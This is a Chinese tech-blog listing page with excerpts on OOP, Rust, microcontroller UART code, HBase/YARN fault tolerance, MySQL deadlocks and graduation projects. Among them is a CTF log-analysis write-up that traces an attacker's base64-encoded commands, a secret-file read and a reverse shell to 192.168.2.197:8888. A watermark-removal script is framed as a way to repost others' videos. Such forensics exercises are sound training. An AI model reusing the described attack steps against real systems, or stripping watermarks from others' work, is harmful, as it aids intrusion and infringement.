	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a0dfb1884745aaa8df6cdabb66bb5f47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fe7bd71f4f47e7c377e66678a21289b/" rel="bookmark">
			理解“面向对象编程”概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面向对象编程（Object-Oriented Programming，OOP）是一种软件开发范式，它以“对象”为核心，将程序视为一系列相互协作的对象集合。
面向对象编程语言，计算机学术语，它设计的出发点就是为了能更加直接地描述客观世界中存在的事件（及对象）以及它们之间的关系。
具体来说，面向对象编程是一种程序设计和开发的范式，其核心理念是将数据结构与操作数据的方法绑定在一起，形成一个名为“对象”的基本单元。在OOP中，程序被组织成一系列相互关联、协作的对象，每个对象都拥有自己的属性（数据成员或状态）和行为（方法或功能）。
借助面向对象编程，开发者能更好地抽象出问题域中的概念模型，并以一种更贴近人类认知习惯的方式表达程序逻辑，从而降低复杂度，提高软件开发效率和质量。同时，面向对象编程也有助于团队协作和代码重用，提升软件生命周期内的可维护性和可扩展性。
理解面向对象编程可以从以下几个关键概念出发：对象、类、封装、继承、多态和抽象。 封装、继承和多态是面向对象编程的三大核心特性：
封装：隐藏内部实现细节，仅对外暴露必要的接口，使得代码更易于理解和管理，同时也提高了数据安全性。
继承：允许子类继承父类的属性和方法，实现代码复用，并且可以在继承的基础上扩展或修改功能，构建出层次化的类体系。
多态：同一消息发送给不同的对象会引发不同的行为，即一个接口，多种实现，增强了系统的灵活性与扩展性。
通过这些关键特性，面向对象编程提供了一种更符合人类思维习惯的方式来组织和管理复杂的软件系统，使得开发者能够更加高效地进行设计、编码、测试和维护工作,能够更加直观、高效地对软件系统进行设计、开发和维护。面向对象编程通过模拟现实世界中的实体及其相互关系，将复杂的逻辑结构化为一系列的对象和类。这些对象具有状态（属性）和行为（方法），可以互相协作完成任务。
1、对象 对象是对现实世界实体的抽象表示，每个对象都有自己的属性和行为。属性是指对象的状态或特征，例如一个人可能有姓名、年龄等属性；行为则是对象能够执行的操作，如人可以行走、说话等。
1.1 对象1——账户Account
面向对象编程中，对象是对现实世界实体或概念的一种抽象和模拟。以银行系统中的“账户”为例：
属性（状态）：账户这个对象可以具有多个属性来描述其状态，如余额（balance）、户主姓名（account_holder_name）、账户类型（account_type）、开户日期（open_date）等。
行为（方法）：账户对象还可以拥有执行特定操作的方法，比如存款（deposit）、取款（withdraw）、查询余额（check_balance）、转账（transfer）等。这些方法定义了账户能够执行的功能，并且可能会影响账户的状态。
通过这种方式，我们可以在软件开发中创建一个“Account”类来表示账户这一实体，该类包含了上述提到的属性和方法。当实例化这个类时，我们就得到了一个具体的账户对象，它可以独立地存储和处理数据，同时与系统的其他部分进行交互。这种基于对象的设计有助于提高代码的可读性、复用性和维护性。
1.2 对象2——汽车Car
对象在面向对象编程（OOP）中是对现实世界实体的一种抽象表示。这种抽象将实体的特征（属性）和行为（方法）封装在一起，形成一个具有独立状态和功能的程序组件。
例如，在现实生活中，汽车是一个实体，它有颜色、品牌、速度等属性，也有启动引擎、刹车、加速等行为。在面向对象编程中，我们可以创建一个Car类来抽象这个实体：
class Car: def __init__(self, color, brand): self.color = color # 属性：颜色 self.brand = brand # 属性：品牌 self.speed = 0 # 属性：速度，默认初始化为0 def start_engine(self): # 方法：启动引擎 print("Engine started.") def brake(self): # 方法：刹车 self.speed = 0 print("Brake applied. Speed set to 0.") def accelerate(self, amount): # 方法：加速 self.speed += amount print(f"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fe7bd71f4f47e7c377e66678a21289b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6afaf0dc3c81e9664b9fff25aafff931/" rel="bookmark">
			03-常用编程概念
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一篇：02-编程猜谜游戏
本章介绍几乎所有编程语言中都会出现的概念，以及它们在 Rust 中的工作原理。许多编程语言的核心都有许多共同点。本章介绍的概念都不是 Rust 独有的，但我们会在 Rust 的上下文中讨论这些概念，并解释使用这些概念的惯例。
具体来说，将学习变量、基本类型、函数、注释和控制流。每个 Rust 程序中都会有这些基础知识，及早学习这些知识将为你的起步打下坚实的基础。
Rust 语言与其他语言一样，有一组关键字仅供该语言使用。请记住，不能将这些关键字用作变量或函数的名称。大多数关键字都有特殊含义，你将在 Rust 程序中使用它们完成各种任务；少数关键字目前没有相关功能，但被保留用于将来可能添加到 Rust 中的功能。
1. 变量与可变性 默认情况下，变量是不可变的。这是 Rust 给你的众多提示之一，让你在编写代码时充分利用 Rust 提供的安全性和易并发性。不过，你仍然可以选择让变量可变。让我们来探讨一下 Rust 如何以及为什么鼓励你偏爱不可变性，以及为什么有时你可能会想选择放弃。
如果变量是不可变的，那么一旦某个值与名称绑定，就无法更改该值。为了说明这一点，请使用 cargo new variables 在你的项目目录中生成一个名为 variables 的新项目。然后，在新的变量目录下，打开 src/main.rs，将其代码替换为以下代码（暂时还无法编译）：
fn main() { let x = 5; println!("The value of x is: {x}"); x = 6; println!("The value of x is: {x}"); } 保存并使用 cargo run 运行程序。你应该会收到一条关于不可变性错误的错误信息，如输出所示：
cargo.exe run Compiling variables v0.1.0 (D:\rustProj\variables) error[E0384]: cannot assign twice to immutable variable `x` --&gt; src\main.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6afaf0dc3c81e9664b9fff25aafff931/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21f6db6948e6f3db08e005536bb34ca7/" rel="bookmark">
			51单片机串口通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		串口 串口号需要一致
串口的介绍
总线的概念 总线是计算机系统中用于在各个组件之间传输数据、地址和控制信号的一种集成电路或物理连接。它是计算机内部各个部件之间进行通信和数据传输的重要途径。
总线可以分为数据总线、地址总线和控制总线三种类型。数据总线用于传输数据，地址总线用于指定内存或者I/O设备的地址，控制总线用于传输控制信号。这三种总线协同工作，使得不同的系统组件能够相互通信，协同工作，从而实现数据传输和协同操作。
在计算机系统中，总线连接着各个重要的组件，如中央处理器（CPU）、内存、输入输出设备（如键盘、鼠标、显示器等），使得它们能够相互通信和协同工作。总线的性能和速度直接影响了整个计算机系统的运行效率和性能。
总线的概念也在其他领域得到应用，比如在汽车电子系统中，各种传感器、执行器和控制单元之间通过总线进行通信和数据传输。总线的概念是计算机和电子系统中一个非常重要的概念，它为各种设备提供了一种统一的通信方式。
中断程序的编写 eg1:使用串口实现秒++的功能
#include &lt;REGX52.H&gt; #include &lt;INTRINS.H&gt; unsigned char Sec; void UART_Init(){ SCON = 0X40; PCON |= 0X80; TMOD &amp;= 0X0F; // 设置定时器模式 TMOD |= 0X20; // 设置定时器模式 TL1 = 0XF3; // 设置定时器的初始值 TH1 = 0XF3; // 设置定时器的初始值 ET1 = 0; // 禁止定时器1中断 TR1 = 1; // 启动定时器1 } // 串口发送函数 void UART_SendByte(unsigned char Byte){ SBUF = Byte; while(TI == 0){ } TI = 0; } void Delay(unsigned int xms)	{ unsigned char i, j; while(xms){ i = 2; j = 239; do{ while(--j); }while(--i); xms--; } } void main(){ // 串口初始化 UART_Init();	while(1){ // 发送一个数据 UART_SendByte(Sec); Sec++; Delay(1000); } } eg2：使用串口发送数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21f6db6948e6f3db08e005536bb34ca7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6c25db6b43a9cfc9bb46b3494747b8a/" rel="bookmark">
			01-开始Rust之旅
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一篇：00-Rust前言
1. 下载Rust 官方推荐使用 rustup 下载 Rust，这是一个管理 Rust 版本和相关工具的命令行工具。下载时需要连接互联网。
这边提供了离线安装版本。本人学习的机器环境为： ubuntu x86_64，因此选用第②个工具链；
1. rust-1.75.0-x86_64-pc-windows-gnu.msi
2. rust-1.75.0-x86_64-unknown-linux-gnu.tar.gz
$ rustc --version rustc 1.75.0 (82e1608df 2023-12-21) 2. 编写和运行 Rust 程序 Rust 对编辑、工具或代码的存放位置没有特别的要求，因此如果你喜欢使用集成开发环境（IDE）而不是命令行，请随意使用你喜欢的集成开发环境。许多集成开发环境现在都在一定程度上支持 Rust；Rust 团队一直致力于通过 rust-analyzer 实现对集成开发环境的强大支持。
vscode可直接安装rust-anslyzer插件；
创建一个新的源文件，并将其命名为 main.rs。Rust 文件总是以 .rs 扩展名结尾。如果你在文件名中使用了多个单词，惯例是使用下划线分隔它们。例如，使用 hello_world.rs 而不是 helloworld.rs。
fn main() { println!("Hello, Rust!"); } 保存文件，在 Linux输入以下命令编译并运行文件：
$ rustc main.rs $ ./main Hello, Rust! 2.1 Rust 程序剖析 这几行定义了一个名为 main 的函数。 main 函数很特别：它总是每个可执行 Rust 程序中运行的第一段代码。这里，第一行声明了一个名为 main 的函数，该函数没有参数，也不返回任何内容。如果有参数，则会放在括号 () 中。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f6c25db6b43a9cfc9bb46b3494747b8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a889630b93faad297ac9273b456ac92b/" rel="bookmark">
			R语言【cli】——ansi_trimws()：从ANSI字符串中删除前导和/或尾随空格
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Package cli version 3.6.0
Description 这个函数类似于base::trimws()，但它适用于ANSI字符串，并保留颜色和其他样式。
Usage ansi_trimws(x, which = c("both", "left", "right")) Arguments 参数【x】：ANSI字符串向量。
参数【which】：是否删除前导或尾随空格或两者都删除。
Value 去掉空白的ANSI字符串。
Examples &gt; trimws(paste0(" ", col_red("I am red"), " ")) [1] "\033[31mI am red\033[39m" &gt; ansi_trimws(paste0(" ", col_red("I am red"), " ")) &lt;cli_ansi_string&gt; [1] I am red &gt; trimws(col_red(" I am red ")) &lt;cli_ansi_string&gt; [1] I am red &gt; ansi_trimws(col_red(" I am red ")) &lt;cli_ansi_string&gt; [1] I am red 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6adbd364f07534a8628a27d37f621eac/" rel="bookmark">
			基于python实现去除视频的水印
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我们再搬运视频的时候常常会遇到视频有水印的问题
如下
下面就通过python来实现对视频水印的去除 在pycharm新建一个项目，创建image，video目录其他不用
必要条件 在终端下载相关依赖包
pip install moviepy==1.0.3 pip installnumpy==1.21.5 pip install opencv_python==4.5.5.62 将要去除水印的视频放在video目录下，运行一下 用鼠标操作去除的部分，回车即可
去除了水印的视频输出到了output文件夹下
查看效果，还不错 代码实现 import os import sys import cv2 import numpy from moviepy import editor VIDEO_PATH = 'video' OUTPUT_PATH = 'output' TEMP_VIDEO = 'temp.mp4' class WatermarkRemover(): def __init__(self, threshold: int, kernel_size: int): self.threshold = threshold #阈值分割所用阈值 self.kernel_size = kernel_size #膨胀运算核尺寸 def select_roi(self, img: numpy.ndarray, hint: str) -&gt; list: ''' 框选水印或字幕位置，SPACE或ENTER键退出 :param img: 显示图片 :return: 框选区域坐标 ''' COFF = 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6adbd364f07534a8628a27d37f621eac/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7de24459529aef7be7f945b652383b3/" rel="bookmark">
			HBase节点故障的容错方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HBase节点故障的容错方案 1. Master高可用1.1 选主和HA切换逻辑 2. RS高可用2.1 感知RS节点异常2.2 异常DN上的数据处理 4. 疑问和思考5. 参考文档 本文主要探讨hbase集群的高可用容错方案和容错能力的探讨。涉及Master和RS相关组件，在出现单机故障时相关的容错方案。
更多关于分布式系统的架构思考请参考文档关于常见分布式组件高可用设计原理的理解和思考
1. Master高可用 1.1 选主和HA切换逻辑 Master的HA机制主要依靠zk完成。整体的逻辑跟HDFS的NN逻辑整体上一致，也略有差别，可以参考 HDFS节点故障的容错方案
相同点
1， Master使用zk的临时锁节点进行选主
2，其他节点的watch机制跟hdfs的逻辑也一致
不同点
1， Master没有另外涉及zkfc辅助选主，而是Master自己完成了相关的逻辑
2，Master集群没有涉及fencing逻辑。
2. RS高可用 RS节点是具体的数据存储节点，HBase通常依赖hdfs进行数据存储，包括wal日志等基础原数据存储等。由于hdfs本身能够提供高可用，并且能够提供远程存储能力，因此1个RS写入的数据（包括wal日志）等能够在另外一个RS中进行数据回放。
由于HBase本身没有直接跟磁盘进行交互，因此底层的磁盘io等信息被hdfs隔离，因此hdfs的读写、存储能力直接影响HBase的性能。
2.1 感知RS节点异常 1，RS在zk中注册临时路径（/hbase/rs），如果RS节点异常，在ttl时间（默认 3min）后临时节点会被zk删除。
2， Master通过watch机制监听rs的相关路径，RS在zk中注册的临时路径过期后被删除，zk会将相关事件通知Master
2.2 异常DN上的数据处理 Master感知到RS异常后，会将RS上的Region信息迁移到其他的RS，并将wal日志在对应的RS节点进行回放，从而确保数据不丢失。
4. 疑问和思考 暂无
5. 参考文档 暂无
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aba7fedbb6196fb833aac5102b29708b/" rel="bookmark">
			【MySQL】InnoDB 什么情况下会产生死锁
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🍎个人博客：个人主页
🏆个人专栏：数据库
⛳️ 功不唐捐，玉汝于成
目录
前言
正文
结语
我的其他博客
前言 在数据库管理系统中，特别是使用 InnoDB 存储引擎的 MySQL 中，死锁是一个可能影响性能和数据一致性的重要问题。随着事务并发性的增加，以及多个事务同时访问相同数据的情况变得普遍，死锁的产生可能性也相应增加。了解死锁可能发生的情况以及采取预防措施对于确保数据库系统的稳定性和可靠性至关重要。
正文 InnoDB 是 MySQL 数据库管理系统中的一种存储引擎，它支持事务和行级锁定。死锁是指两个或多个事务相互等待对方释放锁，从而导致它们都无法继续执行的状态。在 InnoDB 中，死锁可能发生在以下情况下：
事务并发性：死锁通常发生在多个事务同时运行的情况下。如果两个或多个事务试图以不同的顺序锁定同一组资源，可能导致死锁。
事务持有锁并等待锁：一个事务在持有某个锁的同时尝试获取另一个锁，并且另一个事务持有了第二个锁并试图获取第一个锁。这种循环等待的情况可能导致死锁。
未按相同的顺序获取锁：如果不同的事务以不同的顺序获取锁，可能导致死锁。例如，事务A首先获取锁1再获取锁2，而事务B首先获取锁2再获取锁1，这种情况可能导致死锁。
并发事务修改相同数据集：如果多个事务同时尝试修改相同的数据集，并且涉及到锁的竞争，就有可能发生死锁。
长事务：长时间运行的事务增加了死锁发生的可能性，因为长事务持有锁的时间更长，与其他事务产生冲突的机会更多。
为了避免死锁，开发人员可以采取一些措施，例如：
按照相同的顺序获取锁，以减少死锁的可能性。
尽量减少事务持有锁的时间，避免长时间运行的事务。
使用合理的事务隔离级别，不同的隔离级别对锁的使用有不同的影响。
使用事务超时设置，当事务等待锁的时间超过一定阈值时，可以自动回滚事务，避免长时间等待。
监控数据库中的死锁情况，并根据实际情况进行调整和优化，是有效预防和处理死锁的重要手段。
结语 在设计和管理数据库时，预防死锁是一个不可忽视的任务。通过谨慎选择事务隔离级别、按照相同的顺序获取锁、合理设置事务超时等手段，可以有效地减少死锁的发生概率。定期监控数据库中的死锁情况，并根据实际情况进行调整和优化，有助于提高系统的稳定性和性能。在数据库应用开发中，理解并有效处理死锁问题是数据库管理人员和开发人员共同努力的重要方向，以确保系统在高并发环境下能够稳健运行。
我的其他博客 【MySQL】数据库规范化的三大法则 — 一探范式设计原则-CSDN博客
【JAVA】线程的run()和start()有什么区别？-CSDN博客
【日常聊聊】程序员必备的面试技巧：如何在面试战场上脱颖而出-CSDN博客
【JAVA】Java8开始ConcurrentHashMap,为什么舍弃分段锁-CSDN博客
【JAVA】怎么确保一个集合不能被修改-CSDN博客
【Web开发】会话管理与无 Cookie 环境下的实现策略-CSDN博客
【Mybatis】Mybatis如何防止sql注入-CSDN博客
【软件工程】航行敏捷之路：深度解析Scrum框架的精髓-CSDN博客
【Spring】理解IoC与AOP：构建灵活而模块化的软件架构-CSDN博客
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dcf94c5bea07df1a216790d58e98f5bc/" rel="bookmark">
			YARN节点故障的容错方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 YARN节点故障的容错方案 1. RM高可用1.1 选主和HA切换逻辑 2. NM高可用2.1 感知NM节点异常2.2 异常NM上的任务处理 4. 疑问和思考4,1 RM感知NM异常需要10min，对于app来说是否太长了？ 5. 参考文档 本文主要探讨yarn集群的高可用容错方案和容错能力的探讨。涉及RM和NM相关组件，在出现单机故障时相关的容错方案。
更多关于分布式系统的架构思考请参考文档关于常见分布式组件高可用设计原理的理解和思考
1. RM高可用 1.1 选主和HA切换逻辑 RM（ResourceManager）的HA机制主要依靠zk完成。整体的逻辑跟HDFS的NN逻辑整体上一致，也略有差别，可以参考 HDFS节点故障的容错方案
相同点
1， RM使用zk的临时锁节点（ActiveStandbyElectorLock）进行选主
2，其他节点的watch机制跟hdfs的逻辑也一致
不同点
1， RM没有另外涉及zkfc辅助选主，而是RM自己完成了相关的逻辑
2，YARN集群没有涉及fencing逻辑。
2. NM高可用 NM是运行在单个节点上的代理 ，主要职责有
管理Hadoop集群中单个计算节点，功能包括与ResourceManager保持通信管理Container的生命周期、监控每个Container的资源使用(内存、CPU等）情况、追踪节点健康状况、管理日志和不同应用程序用到的附属服务等向ResourceManager汇报各个Container运行状态和节点健康状况，并领取有关Container的命令（比如清理Container）。 2.1 感知NM节点异常 NM启动后通过RPC函数ResourceTracker#registerNodeManager向RM注册，之后将被加入到NMLivenessMonitor中进行监控。它必须周期性通过RPC函数ResourceTracker#nodeHeartBeat向RM汇报心跳以表明自己还活着，如果一段时间内(默认是10min）内为汇报心跳，则RM宣布它已经死亡，所以正在运行在它上面的Container将被回收。
当RM判断NM宕机后，需要
RM剔除对应的NM，并将异常NM上的container标记死亡，后续container不会被分配到对应的NM通知AM，告知异常NM上的container已经死亡，由AM决定下一步的任务行为。 2.2 异常NM上的任务处理 由于在yarn集群中，任务的管理是通过AM进行管理的，因此RM感知到NM异常后，标记对应的containier死亡，并需要通知对应的AM。NM或者RM并不负责运行在上面的app运行状态，而是由AM来决定下一步动作（AM在跟RM申请一个NM执行container，还是标记app失败等）。
4. 疑问和思考 4,1 RM感知NM异常需要10min，对于app来说是否太长了？ 视情况而定。由于RM感知NM异常，需要10min的时间，然后才会通知AM，这个时间相对于大多数任务而言还是比较长的。如果任务对数据的实时性要求很高，建议AM创建container后，container主动给AM汇报心跳，来决定业务行为，能够感觉相关的业务需求来进行开发。通常flink、spark任务都是过该思路进行开发的。
5. 参考文档 一文搞定Journal Node原理 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf8a6e3176cd93c137c41f39877d4403/" rel="bookmark">
			[陇剑杯 2021]简单日志分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		[陇剑杯 2021]简单日志分析 题目做法及思路解析（个人分享）
问一：某应用程序被攻击，请分析日志后作答： 黑客攻击的参数是______。（如有字母请全部使用小写）。 题目思路： 分析日志文件，发现日志内没有成功访问的记录（没有服务器响应返回的200），却发现有多次500响应，并且黑客都通过参数进行了访问，且传输了一段base64编码的值，猜测黑客通过页面报错的回显信息得到了想要的内容
网页500错误（500 Internal Server Error）是一种常见的HTTP状态码，指示Web服务器遇到了错误，无法完成客户端的请求。500错误通常是由于服务器端的问题导致的，例如代码错误、数据库连接失败、服务器繁忙等。
方法： 通过分析日志，得到了参数内容为user
flag{user}
问二：某应用程序被攻击，请分析日志后作答： 黑客查看的秘密文件的绝对路径是_____________。 题目思路： 通过之前的分析，我们知道了黑客通过user参数执行了想要执行的命令，并通过页面的报错回显得了命令回显。所以我们可以解码黑客传递的内容来继续进行分析
方法： 使用Ctrl+F搜索?user=进行查看
将base64编码进行解码，得到黑客查看的密码文件
flag{/Th4s_IS_VERY_Import_Fi1e}
问三：某应用程序被攻击，请分析日志后作答： 黑客反弹shell的ip和端口是_____________。（格式使用“ip:端口"，例如127.0.0.1:2333）。 题目思路： 通过之前对黑客传递编码的分析，我们知道了黑客执行了查看当前用户和查看密码文件的操作，需要继续对黑客传递的编码内容进行解码分析
方法： 使用Ctrl+F搜索?user=进行查看
将base64编码进行解码，注意该编码内含有一个URL加密后的符号 “+”，需要先URL解码后在对base64编码解密。解码后得到黑客反弹shell的ip和端口
%2b为URL加密后的符号 “+”
flag{192.168.2.197:8888}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3238140f84585de88f008f261b9e4ee/" rel="bookmark">
			计算机毕业设计SSM基于的智能点餐系统5tjmh9【附源码】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目运行
环境配置：
Jdk1.8 + Tomcat7.0 + Mysql + HBuilderX（Webstorm也行）+ Eclispe（IntelliJ IDEA,Eclispe,MyEclispe,Sts都支持）。
项目技术：
vue + mybatis + Maven +mysql5.7或8.0等等组成，B/S模式 + Maven管理等等。
环境需要
1.运行环境：最好是java jdk 1.8，我们在这个平台上运行的。其他版本理论上也可以。
2.IDE环境：IDEA，Eclipse,Myeclipse都可以。推荐IDEA;
3.tomcat环境：Tomcat 7.x,8.x,9.x版本均可
4.硬件环境：windows 7/8/10 4G内存以上；或者 Mac OS；
5.是否Maven项目: 否；查看源码目录中是否包含pom.xml；若包含，则为maven项目，否则为非maven项目
6.数据库：MySql 5.7/8.0等版本均可；
毕设帮助，指导，本源码分享，调试部署(见文末) 3.2系统功能需求分析 在功能方面，不需要人工输入就可以分析用户在什么场景使用智能点餐系统，要保证可以在很大程度上满足用户解决生活问题，满足用户需求，改善人们生活。
3.2.1系统功能概述 前台页面：若进入本网站，需要输入账号密码，才能进入客户主界面。只有账号密码同时验证通过，用户才可以进入网站前台页面，进入前台页面后，用户可以在搜索栏中对自己想要的菜品进行选购下单，选好后用户可以通过查看我的订单来校对，经过对收货地址、联系方式等个人信息的完善后可以下单进行派送。
后台管理页面：主要是管理员登录本网站。管理员输入管理员账号密码后，校验无误后方可进入后台管理主界面，对用户使用的权限管理，设置会员等管理以及对网站咨询信息进行管理[9]。
3.2其他系统需求分析 3.2.1性能要求 在开发了一个功能较为良好系统之后，首要考虑的就是它的性能要求，比如当用户使用它进行点击或提交功能时，它会产生多久的延迟，系统响应速度快不快，如果短时间同时有较多用户访问网站是否会产生系统崩溃，是否采用高并发接口，另外，存储功能进行中的代码量是否满足算法和数据结构，以及是否占用较大内存等：
（1）系统应具备快速的反映时间，对于并发特征得到解决[10]。
（2）系统对用户密码是否进行了加密并进行大量安全处理。
（3）系统代码量是否简洁，不会占用计算机太多内存。
3.2.2安全要求 对于安全要求要进行可靠性分析，可靠性分析有利于可实现安全性、可靠 性设计与系统功能设计在数据源上的统一[11]。就本系统的安全性能而言，数据的帐户和密码需要以明文形式显示，并严格加密。更改密码、修改个人数据、添加信息需要相应权限，账户冻结、解冻，并设置业务日志。用户点击业务信息，登录日志、用户登录信息、时间点、IP、地址等都会被随时监控。
3.2.3作业环境要求 （1）系统：Windows系统足够，兼容性强
（2）Web服务器：内置tomcat，无需安装、运行和使用
（3）数据库服务器：MySQL 5.5及以上，图形界面为SQLYG
（4）浏览器：谷歌或Firefox开发者浏览器
（5）JDK1.8及以上，内置插件maven等。
3.3本章概述
本章主要介绍智能点餐系统的使用案例和系统的相关可行性要求。我已经从技术、经济、法律和运营四个方面确认了该系统可以在线运行。
4 系统设计 4.1 设计模型的建立 4.1.1 系统结构图 系统总共包括前台和后台功能模块，前台包括餐桌信息、菜品信息、交流论坛、公告资讯、购物车；后台包括个人中心、用户管理、餐桌信息管理、餐桌预订管理、菜品分类管理、菜品信息管理、交流论坛、系统管理、订单管理；系统结构如图4-1所示。
图4-1系统结构图
4.1.2 时序图的建立 本系统的登录时序图如图4-2所示。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3238140f84585de88f008f261b9e4ee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bf617d17df281ea13a92026b7049a84/" rel="bookmark">
			计算机毕业设计SSM基于的疫情物资管理系统o489k9【附源码】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目运行
环境配置：
Jdk1.8 + Tomcat7.0 + Mysql + HBuilderX（Webstorm也行）+ Eclispe（IntelliJ IDEA,Eclispe,MyEclispe,Sts都支持）。
项目技术：
vue + mybatis + Maven +mysql5.7或8.0等等组成，B/S模式 + Maven管理等等。
环境需要
1.运行环境：最好是java jdk 1.8，我们在这个平台上运行的。其他版本理论上也可以。
2.IDE环境：IDEA，Eclipse,Myeclipse都可以。推荐IDEA;
3.tomcat环境：Tomcat 7.x,8.x,9.x版本均可
4.硬件环境：windows 7/8/10 4G内存以上；或者 Mac OS；
5.是否Maven项目: 否；查看源码目录中是否包含pom.xml；若包含，则为maven项目，否则为非maven项目
6.数据库：MySql 5.7/8.0等版本均可；
毕设帮助，指导，本源码分享，调试部署(见文末) 2.1.2 功能需求分析 疫情物资管理是以疫情物资的状况为起点，综合网络空间开发设计要求。目的是将疫情物资通过网络平台变换为在网上操作，完成疫情物资的方便快捷、安全性、规范做了保障，目标明确[9]。
这一系统可以分成三种类别的用例实体模型，分别是用户、配送员和管理员。这三个角色的作用将在下面详解和叙述。
(1)用户
主要使用者为用户。具备有：公告信息管理、物资信息管理、物资申请管理、配送信息管理、急缺物资管理等功能。用户用例图如图2-1所示。
图2-1 用户用例图
(2)配送员
其中使用者为配送员。具备有：公告信息管理、物资信息管理、物资出库管理、配送信息管理、体温打卡管理、请假申请管理等功能。配送员用例图如图2-2所示。
图2-2 配送员用例图
(2)管理员
进行维护，以及平台的后台管理工作都依靠管理员，其可以对一些信息进行管理。需具备功能有系统首页、个人中心、用户管理、配送员管理、公告信息管理、物资信息管理、物资分类管理、物资申请管理、物资入库管理、物资出库管理、配送信息管理、急缺物资管理、体温打卡管理、请假申请管理。管理员用例图如图2-3所示。
图2-3 管理员用例图
2.1.3 非功能需求分析 (1)系统的实用性
疫情物资管理系统的开发，要求做到足够的简洁、易用，能为用户提供快捷、便利的使用体验，减少系统的无用功能，以及用户使用上的多余操作[11]。
(2)系统的安全性
疫情物资管理系统纪录了至关重要的用户信息等信息，应当具备很高的安全性和经济价值。因此为了更好地保证用户的重要信息不被泄露、破坏和盗取，一定要保证系统的安全性。
(3)系统的稳定性
当一个系统的稳定性没法确保时，用户在应用系统时很容易发生数据操作不正确或网页页面回应不正确等。系统的稳定性对用户对系统的评价有较大的影响，是评价系统的一个主要指标值。因而，为了确保系统的稳定性，开发设计时要挑选稳定性高的操作系统、开发软件、数据库、服务器、以及其他工具。
(4)系统的开放性
要使系统软件对外开放，最先要保证系统具备较好的兼容模式，而且大部分版本的Windows电脑操作系统都能正常的运作。此外，尽可能适用不一样的电脑浏览器版本，同时系统的开放性也体现在系统方便日后的管理和升级。
2.2相关技术介绍 本章主要对开发疫情物资管理系统所涉及的技术以及开发所用环境进行介绍说明，对包括java语言，SSM框架和开发用到的软件和数据库等环境进行介绍说明。
2.2.1 SSM框架介绍
SSM就是Spring+Spring MVC+MyBatis，其中SpringMVC实际上是Spring中包含的内容。SSM是当下主流的轻量级Java EE企业级框架，既可以作为数据源较简单的web项目的框架，也可以用来搭建大型的企业级应用系统。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6bf617d17df281ea13a92026b7049a84/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfc49177d5a979f8c5b70b1e8af7907e/" rel="bookmark">
			使用OpenCV绘制图形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用OpenCV绘制图形 绘制黄色的线：
# 绘制一个黑色的背景画布 canvas = np.zeros((300, 300, 3), np.uint8) # 在画布上，绘制一条起点坐标为(150, 50)、终点坐标为(150, 250)，黄色的，线条宽度为20的线段 canvas = cv2.line(canvas, (150, 50), (150, 250), (0, 255, 255), 20) 绘制矩形：
# 在画布上绘制一个左上角坐标为(65,65)，右下角坐标为(180,150)，青色的，线条宽度为20的矩形边框 canvas = cv2.rectangle(canvas, (65, 65), (200, 150), (255, 255, 0), 20) 绘制圆形：
# 在画布上，绘制一个圆心坐标为(150, 50)，半径为40，黄色的实心圆形 canvas = cv2.circle(canvas, (150, 50), 40, (0, 255, 255), -1) 绘制多边形：
# 根据坐标[100, 50], [200, 50], [250, 250], [50, 250]，绘制一个闭合的，红色的，线条宽度为5的等腰梯形边框 canvas = cv2.polylines(canvas, [np.array([[100, 50], [200, 50], [250, 250], [50, 250]], np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dfc49177d5a979f8c5b70b1e8af7907e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
